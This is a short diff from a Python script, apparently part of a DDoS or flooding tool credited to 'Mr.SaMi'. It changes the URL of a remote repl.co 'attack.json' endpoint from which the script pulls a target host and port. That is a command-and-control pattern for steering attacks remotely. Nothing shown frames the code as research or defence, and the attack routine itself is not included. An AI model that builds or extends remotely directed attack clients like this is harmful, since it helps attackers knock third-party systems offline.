@@ -21,7 +21,7 @@ green = "\033[1;32m"
 cyan = "\033[1;36m"
 
 # Coded By Mr.SaMi
-target_api = "https://attack-1915.attack-ye.repl.co/attack.json"
+target_api = "https://attack--attacker-1915.repl.co/attack.json"
 attack = requests.get(target_api).json()
 target_host = attack["attack"]["host"]
 target_port = attack["attack"]["port"]
